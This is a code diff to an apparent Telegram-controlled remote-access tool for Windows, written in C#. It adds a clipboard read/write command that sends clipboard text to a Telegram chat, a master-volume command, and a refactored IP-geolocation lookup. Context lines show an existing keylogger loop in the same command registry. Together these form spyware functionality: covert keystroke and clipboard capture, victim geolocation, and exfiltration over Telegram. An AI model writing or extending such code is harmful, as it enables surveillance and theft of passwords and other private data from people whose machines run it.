@@ -11,6 +11,7 @@ using System.Drawing;
 using Telegram.Bot;
 using WindowsInput;
 using NAudio.Wave;
+using NAudio.CoreAudioApi;
 using System.Text;
 using System.Net;
 
@@ -401,6 +402,48 @@ public static class CommandRegistry
                         drivesStr.AppendLine();
                     }
                     await Program.Bot.SendMessage(model.Message.Chat.Id, string.Join(string.Empty, drivesStr.ToString().Take(4096).ToArray()), ParseMode.Html, replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
+                }
+                catch (Exception ex)
+                {
+                    await Program.ReportExceptionAsync(model.Message, ex);
+                }
+            }
+        });
+
+        commandsList.Add(new BotCommand
+        {
+            Command = "volume",
+            ArgsCount = -2,
+            Description = "Get or set master volume (0-100).",
+            Example = "/volume 50",
+            Execute = async model =>
+            {
+                try
+                {
+                    using MMDeviceEnumerator enumerator = new MMDeviceEnumerator();
+                    using MMDevice device = enumerator.GetDefaultAudioEndpoint(DataFlow.Render, Role.Multimedia);
+
+                    if (model.Args.Length == 0 || model.Args[0].Equals("get", StringComparison.OrdinalIgnoreCase))
+                    {
+                        int vol = (int)(device.AudioEndpointVolume.MasterVolumeLevelScalar * 100);
+                        await Program.Bot.SendMessage(model.Message.Chat.Id, $"Volume: {vol}%", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
+                        return;
+                    }
+
+                    string valueArg = model.Args[0].Equals("set", StringComparison.OrdinalIgnoreCase) && model.Args.Length > 1
+                        ? model.Args[1]
+                        : model.Args[0];
+
+                    if (float.TryParse(valueArg, out float volValue))
+                    {
+                        volValue = Math.Clamp(volValue, 0f, 100f);
+                        device.AudioEndpointVolume.MasterVolumeLevelScalar = volValue / 100f;
+                        await Program.Bot.SendMessage(model.Message.Chat.Id, $"Volume set to {volValue}%", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
+                    }
+                    else
+                    {
+                        await Program.Bot.SendMessage(model.Message.Chat.Id, "Usage: /volume [get]|set <0-100>", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
+                    }
                 }
                 catch (Exception ex)
                 {
@@ -1167,10 +1210,8 @@ public static class CommandRegistry
                         StringBuilder mappedKeys = new StringBuilder();
                         StringBuilder unmappedKeys = new StringBuilder();
                         List<uint> LastKeys = new List<uint>();
-                        List<uint> shit = new List<uint>();
                         while (KeylogActive)
                         {
-                            shit.Clear();
                             var keys = Keylogger.GetPressingKeys();
                             if (LastKeys.SequenceEqual(keys) is not true)
                             {
@@ -1378,25 +1419,69 @@ public static class CommandRegistry
             ArgsCount = 0,
             Execute = async model =>
             {
-                var ipAddress = await Utils.GetIpAddressAsync();
-                HttpClient httpClient = new HttpClient();
-                string ipApiResponse = await httpClient.GetStringAsync("http://ip-api.com/xml/" + ipAddress);
-                System.Xml.XmlDocument xmlDocument = new System.Xml.XmlDocument();
-                xmlDocument.LoadXml(ipApiResponse);
-
-                TextReader xmlDocumentReader = new StringReader(xmlDocument.ChildNodes[1].OuterXml);
-                var serializer = new System.Xml.Serialization.XmlSerializer(typeof(NetworkInfo));
-                NetworkInfo ni = serializer.Deserialize(xmlDocumentReader) as NetworkInfo;
+                NetworkInfo? info = await Utils.GetNetworkInfoAsync();
+                if (info == null)
+                {
+                    await Program.Bot.SendMessage(model.Message.Chat.Id, "Unable to retrieve network info.");
+                    return;
+                }
 
                 string networkInformationString = "Network information:\n\n" +
-                $"IP: {ipAddress}\n" +
-                $"ISP: {ni.Isp}\n" +
-                $"Country: {ni.Country}\n" +
-                $"City: {ni.City}\n" +
-                $"Timezone: {ni.Timezone}\n" +
-                $"Country Code: {ni.CountryCode}";
+                $"IP: {info.Query}\n" +
+                $"ISP: {info.Isp}\n" +
+                $"Country: {info.Country}\n" +
+                $"City: {info.City}\n" +
+                $"Timezone: {info.Timezone}\n" +
+                $"Country Code: {info.CountryCode}";
 
                 await Program.Bot.SendMessage(model.Message.Chat.Id, networkInformationString);
+            }
+        });
+
+        commandsList.Add(new BotCommand
+        {
+            Command = "clipboard",
+            Aliases = new[] { "clip" },
+            ArgsCount = -2,
+            Description = "Get or set clipboard text.",
+            Example = "/clipboard get",
+            Execute = async model =>
+            {
+                try
+                {
+                    if (model.Args.Length == 0 ||
+                        model.Args[0].Equals("get", StringComparison.OrdinalIgnoreCase))
+                    {
+                        string text = ClipboardUtils.GetText();
+                        if (string.IsNullOrEmpty(text))
+                            text = "<i>[empty]</i>";
+                        await Program.Bot.SendMessage(
+                            model.Message.Chat.Id,
+                            text,
+                            Telegram.Bot.Types.Enums.ParseMode.Html,
+                            replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
+                    }
+                    else if (model.Args[0].Equals("set", StringComparison.OrdinalIgnoreCase))
+                    {
+                        string text = string.Join(' ', model.Args.Skip(1));
+                        ClipboardUtils.SetText(text);
+                        await Program.Bot.SendMessage(
+                            model.Message.Chat.Id,
+                            "Clipboard updated.",
+                            replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
+                    }
+                    else
+                    {
+                        await Program.Bot.SendMessage(
+                            model.Message.Chat.Id,
+                            "Usage: /clipboard get | set <text>",
+                            replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
+                    }
+                }
+                catch (Exception ex)
+                {
+                    await Program.ReportExceptionAsync(model.Message, ex);
+                }
             }
         });
 
